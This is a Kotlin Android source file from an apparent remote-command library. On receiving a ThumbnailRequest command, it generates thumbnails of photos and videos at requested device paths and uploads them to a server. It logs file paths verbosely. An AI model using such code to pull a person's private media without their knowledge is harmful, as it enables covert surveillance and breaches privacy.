package com.hawkshaw.library.features.media.filecrud

import android.graphics.Bitmap
import android.graphics.BitmapFactory
import androidx.exifinterface.media.ExifInterface
import android.media.MediaMetadataRetriever
import android.media.ThumbnailUtils
import android.net.Uri
import android.os.Build
import android.provider.MediaStore
import android.util.Log // Added for Android logging
import androidx.annotation.RequiresApi
import com.hawkshaw.library.App
import com.hawkshaw.library.datalayer.Injector
import com.hawkshaw.library.datalayer.models.Command
import com.hawkshaw.library.datalayer.network.grpc.GrpcResponse // Import GrpcResponse
import com.hawkshaw.library.datalayer.network.twirp.ApiResponse // Ensure this is the correct ApiResponse class
import com.hawkshaw.library.logger.Logger
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.flow
import kotlinx.coroutines.flow.collect // Import collect for Flow
import kotlinx.coroutines.withContext
import java.io.ByteArrayOutputStream
import java.io.File
import kotlin.concurrent.getOrSet
import androidx.core.graphics.scale

private const val TAG = "ThumbnailsUtils"

// Thread-local ByteArrayOutputStream to reuse across operations
private val streamThreadLocal = ThreadLocal<ByteArrayOutputStream>()

/**
 * Get the shared ByteArrayOutputStream for this thread
 */
private fun getStream(): ByteArrayOutputStream {
    // Log.d(TAG, "[DEBUG] getStream called.")
    return streamThreadLocal.getOrSet {
        Log.d(TAG, "[DEBUG] Initializing new ByteArrayOutputStream for this thread.")
        ByteArrayOutputStream()
    }
}

/**
 * Convert a bitmap to a byte array
 */
private fun toByteArray(bitmap: Bitmap): ByteArray {
    Log.d(TAG, "[DEBUG] toByteArray called for bitmap: $bitmap")
    val stream = getStream()
    stream.reset()
    Log.d(TAG, "[DEBUG] toByteArray: Stream reset. Compressing bitmap to PNG, quality 90.")
    bitmap.compress(Bitmap.CompressFormat.PNG, 90, stream)
    val byteArray = stream.toByteArray()
    Log.d(TAG, "[DEBUG] toByteArray: Bitmap compressed. Byte array size: ${byteArray.size}")
    return byteArray
}

/**
 * Extract a thumbnail from an image file
 */
@RequiresApi(Build.VERSION_CODES.O)
private fun getImageThumbnail(file: File): ByteArray? {
    Log.d(TAG, "[DEBUG] getImageThumbnail called for file: ${file.path}")
    val exifInterface = try {
        Log.d(TAG, "[DEBUG] Attempting to read EXIF for ${file.path}")
        ExifInterface(file.path)
    } catch (e: Exception) {
        Log.w(TAG, "[DEBUG] Failed to initialize ExifInterface for ${file.path}: ${e.message}")
        Logger.e(TAG, "Failed to read EXIF for ${file.path}: ${e.message}", e, false, 12, null)
        null
    }

    val bitmap = if (exifInterface != null && exifInterface.hasThumbnail()) {
        Log.d(TAG, "[DEBUG] EXIF thumbnail found for ${file.path}. Extracting thumbnailBitmap.")
        exifInterface.thumbnailBitmap // This can return null if extraction fails despite hasThumbnail()
    } else {
        Log.d(TAG, "[DEBUG] No EXIF thumbnail for ${file.path} or exifInterface is null. Attempting to decode full image.")
        try {
            BitmapFactory.decodeFile(file.path)?.let { fullBitmap ->
                Log.d(TAG, "[DEBUG] Full image decoded for ${file.path}. Original size: ${fullBitmap.width}x${fullBitmap.height}. Extracting thumbnail (128x128).")
                val thumbnail = ThumbnailUtils.extractThumbnail(fullBitmap, 128, 128)
                Log.d(TAG, "[DEBUG] Thumbnail extracted from full image. Size: ${thumbnail?.width}x${thumbnail?.height}. Recycling full bitmap.")
                fullBitmap.recycle() // Recycle the full bitmap after extraction
                thumbnail
            }
        } catch (e: Exception) {
            Log.e(TAG, "[DEBUG] Error decoding/extracting image thumbnail from ${file.path}: ${e.message}", e)
            // Existing Logger.e is fine for detailed error
            Logger.e(TAG, "Error extracting image thumbnail from ${file.path}: ${e.message}", e, false, 12, null)
            null
        }
    }

    return if (bitmap != null) {
        Log.d(TAG, "[DEBUG] Bitmap obtained for ${file.path}. Converting to byte array.")
        val byteArray = toByteArray(bitmap)
        bitmap.recycle() // Recycle bitmap after converting to byte array
        Log.d(TAG, "[DEBUG] Bitmap recycled for ${file.path} after toByteArray.")
        byteArray
    } else {
        Log.w(TAG, "[DEBUG] No bitmap could be obtained for image thumbnail: ${file.path}")
        null
    }
}

/**
 * Extract a thumbnail from a video file
 */
private fun getVideoThumbnail(file: File): ByteArray? {
    Log.d(TAG, "[DEBUG] getVideoThumbnail called for file: ${file.path}")
    val mediaMetadataRetriever = MediaMetadataRetriever()
    var finalByteArray: ByteArray? = null
    try {
        Log.d(TAG, "[DEBUG] Setting data source for MediaMetadataRetriever: ${Uri.fromFile(file)}")
        mediaMetadataRetriever.setDataSource(App.getContext(), Uri.fromFile(file))
        Log.d(TAG, "[DEBUG] Attempting to get frame at time (1000us) for ${file.path}")
        val frameAtTime = mediaMetadataRetriever.getFrameAtTime(1000, MediaMetadataRetriever.OPTION_CLOSEST_SYNC)

        if (frameAtTime != null) {
            Log.d(TAG, "[DEBUG] Frame retrieved for ${file.path}. Original size: ${frameAtTime.width}x${frameAtTime.height}. Scaling to 128x128.")
            val bitmap = frameAtTime.scale(128, 128, false) // Scale to target size
            frameAtTime.recycle() // Recycle the original frame bitmap
            Log.d(TAG, "[DEBUG] Frame scaled and original recycled. Converting to byte array.")
            finalByteArray = toByteArray(bitmap)
            bitmap.recycle() // Recycle scaled bitmap after converting to byte array
            Log.d(TAG, "[DEBUG] Scaled bitmap recycled after toByteArray for ${file.path}.")
        } else {
            Log.w(TAG, "[DEBUG] MediaMetadataRetriever.getFrameAtTime returned null for ${file.path}")
        }
    } catch (e: Exception) {
        Log.e(TAG, "[DEBUG] MediaMetadataRetriever error for ${file.path}: ${e.message}", e)
        Logger.e(TAG, "Video MMR error for ${file.path}: ${e.message}", e, false, 12, null)

        Log.d(TAG, "[DEBUG] Fallback: Attempting ThumbnailUtils.createVideoThumbnail for ${file.path}")
        try {
            val bitmap = ThumbnailUtils.createVideoThumbnail(file.path, MediaStore.Images.Thumbnails.MINI_KIND)
            if (bitmap != null) {
                Log.d(TAG, "[DEBUG] ThumbnailUtils.createVideoThumbnail succeeded for ${file.path}. Size: ${bitmap.width}x${bitmap.height}. Converting to byte array.")
                finalByteArray = toByteArray(bitmap)
                bitmap.recycle()
                Log.d(TAG, "[DEBUG] ThumbnailUtils bitmap recycled after toByteArray for ${file.path}.")
            } else {
                Log.w(TAG, "[DEBUG] ThumbnailUtils.createVideoThumbnail returned null for ${file.path}")
            }
        } catch (tuException: Exception) {
            Log.e(TAG, "[DEBUG] ThumbnailUtils.createVideoThumbnail error for ${file.path}: ${tuException.message}", tuException)
            Logger.e(TAG, "Video TU error for ${file.path}: ${tuException.message}", tuException, false, 12, null)
        }
    } finally {
        Log.d(TAG, "[DEBUG] Releasing MediaMetadataRetriever for ${file.path}")
        try {
            mediaMetadataRetriever.release()
            Log.d(TAG, "[DEBUG] MediaMetadataRetriever released successfully for ${file.path}")
        } catch (releaseEx: Exception) {
            Log.e(TAG, "[DEBUG] Error releasing MediaMetadataRetriever: ${releaseEx.message}", releaseEx)
            Logger.e(TAG, "Error releasing MediaMetadataRetriever: ${releaseEx.message}", releaseEx, false, 12, null)
        }
    }
    Log.d(TAG, "[DEBUG] getVideoThumbnail for ${file.path} returning byte array of size: ${finalByteArray?.size ?: "null"}")
    return finalByteArray
}


/**
 * Get thumbnails for media files (Generates a Flow of Pair<ByteArray?, String>)
 */
@RequiresApi(Build.VERSION_CODES.O)
private suspend fun getMediaThumbnails(paths: List<String>): Flow<Pair<ByteArray?, String>> = withContext(Dispatchers.IO) {
    Log.d(TAG, "[DEBUG] getMediaThumbnails called with ${paths.size} paths.")
    flow {
        for (path in paths) {
            Log.d(TAG, "[DEBUG] getMediaThumbnails: Processing path: $path")
            val file = File(path)
            if (!file.exists() || !file.isFile) {
                Log.w(TAG, "[DEBUG] getMediaThumbnails: File not found or is not a file: $path")
                Logger.d(TAG, "File not found or is not a file: $path", false, 8, null)
                emit(null to path) // Emit null thumbnail if file is invalid
                continue
            }

            val thumbnail: ByteArray? = when {
                path.endsWith(".jpg", ignoreCase = true) ||
                path.endsWith(".jpeg", ignoreCase = true) ||
                path.endsWith(".png", ignoreCase = true) -> {
                    Log.d(TAG, "[DEBUG] getMediaThumbnails: Identified as image: $path. Calling getImageThumbnail.")
                    getImageThumbnail(file)
                }

                path.endsWith(".mp4", ignoreCase = true) ||
                path.endsWith(".3gp", ignoreCase = true) ||
                path.endsWith(".webm", ignoreCase = true) ||
                path.endsWith(".mkv", ignoreCase = true) -> {
                    Log.d(TAG, "[DEBUG] getMediaThumbnails: Identified as video: $path. Calling getVideoThumbnail.")
                    getVideoThumbnail(file)
                }

                else -> {
                    Log.w(TAG, "[DEBUG] getMediaThumbnails: Unsupported file type for thumbnail: $path")
                    Logger.d(TAG, "Unsupported file type for thumbnail: $path", false, 4, null)
                    null
                }
            }
            Log.d(TAG, "[DEBUG] getMediaThumbnails: Emitting thumbnail (size: ${thumbnail?.size ?: "null"}) for path: $path")
            emit(thumbnail to path)
        }
        Log.d(TAG, "[DEBUG] getMediaThumbnails: Finished processing all paths.")
    }
}

/**
 * Push thumbnails to the server.
 * This function now collects from the flow of upload responses and aggregates the result.
 */
@RequiresApi(Build.VERSION_CODES.O)
suspend fun pushThumbnails(request: Command.ThumbnailRequest): ApiResponse<*> = withContext(Dispatchers.IO) {
    Log.d(TAG, "[DEBUG] pushThumbnails called with request: $request")
    val thumbnailsMap = mutableMapOf<String, ByteArray?>()

    Log.d(TAG, "[DEBUG] pushThumbnails: Generating thumbnails for ${request.list.size} paths.")
    request.list.forEach { path ->
        Log.d(TAG, "[DEBUG] pushThumbnails: Processing path for thumbnail generation: $path")
        val file = File(path)
        val thumbnail = when {
            path.endsWith(".jpg", ignoreCase = true) ||
                    path.endsWith(".jpeg", ignoreCase = true) ||
                    path.endsWith(".png", ignoreCase = true) -> {
                Log.d(TAG, "[DEBUG] pushThumbnails: Identified as image for direct generation: $path")
                getImageThumbnail(file)
            }

            path.endsWith(".mp4", ignoreCase = true) ||
                    path.endsWith(".3gp", ignoreCase = true) ||
                    path.endsWith(".webm", ignoreCase = true) ||
                    path.endsWith(".mkv", ignoreCase = true) -> {
                Log.d(TAG, "[DEBUG] pushThumbnails: Identified as video for direct generation: $path")
                getVideoThumbnail(file)
            }

            else -> {
                Log.w(TAG, "[DEBUG] pushThumbnails: Unsupported file type during direct generation: $path")
                null
            }
        }
        Log.d(TAG, "[DEBUG] pushThumbnails: Thumbnail generated for $path (size: ${thumbnail?.size ?: "null"}). Adding to map.")
        thumbnailsMap[path] = thumbnail
    }
    Log.d(TAG, "[DEBUG] pushThumbnails: Finished generating thumbnails. Map size: ${thumbnailsMap.size}")

    val validThumbnails = thumbnailsMap.filterValues { it != null }.mapValues { it.value!! }
    Log.d(TAG, "[DEBUG] pushThumbnails: Filtered valid thumbnails. Count: ${validThumbnails.size}")
    val uploadRequest = ThumbnailUploadRequest(
        thumbnails = validThumbnails,
        paths = request.list ?: emptyList()
    )
    Log.d(TAG, "[DEBUG] pushThumbnails: Prepared ThumbnailUploadRequest: $uploadRequest")

    try {
        Log.d(TAG, "[DEBUG] pushThumbnails: Calling Injector.INSTANCE.fileService.uploadThumbnails.")
        val response = Injector.INSTANCE.fileService.uploadThumbnails(uploadRequest)
        Log.d(TAG, "[DEBUG] pushThumbnails: Received response from fileService: $response")

        return@withContext when (response) {
            is ApiResponse.Success<*> -> {
                // Corrected Log: Removed .data as it's unresolved
                Log.d(TAG, "[DEBUG] pushThumbnails: Upload successful. Response: $response")
                Logger.d(
                    TAG,
                    "Uploaded ${validThumbnails.size} thumbnails successfully", // Log count of successfully generated and uploaded thumbnails
                    false,
                    4,
                    null
                )
                response
            }
            is ApiResponse.Error<*> -> {
                // Corrected Log: Removed .errorCode as it's unresolved
                Log.e(TAG, "[DEBUG] pushThumbnails: Upload failed. Error: ${response.errorMessage}")
                Logger.e(
                    TAG,
                    "Thumbnail upload failed: ${response.errorMessage}",
                    b = false,
                    i = 12,
                    nothing = null
                )
                response
            }
            is ApiResponse.InProgress<*> -> {
                Log.d(TAG, "[DEBUG] pushThumbnails: Upload in progress.")
                Logger.d(TAG, "Thumbnail upload in progress", false, 4, null)
                response
            }
            else -> {
                Log.e(TAG, "[DEBUG] pushThumbnails: Received unexpected response type from fileService.")
                Logger.e(
                    TAG,
                    "Received unexpected response type",
                    b = false,
                    i = 12,
                    nothing = null
                )
                ApiResponse.Error("Unexpected response type")
            }
        }
    } catch (e: Exception) {
        Log.e(TAG, "[DEBUG] pushThumbnails: Exception during thumbnail upload network call: ${e.message}", e)
        Logger.e(TAG, "Exception during thumbnail upload: ${e.message}", e, false, 12, null)
        return@withContext ApiResponse.Error(e.message ?: "Unknown upload error")
    }
}

/**
 * Data class representing a thumbnail upload request
 */
data class ThumbnailUploadRequest(
    val thumbnails: Map<String, ByteArray>,
    val paths: List<String>
)
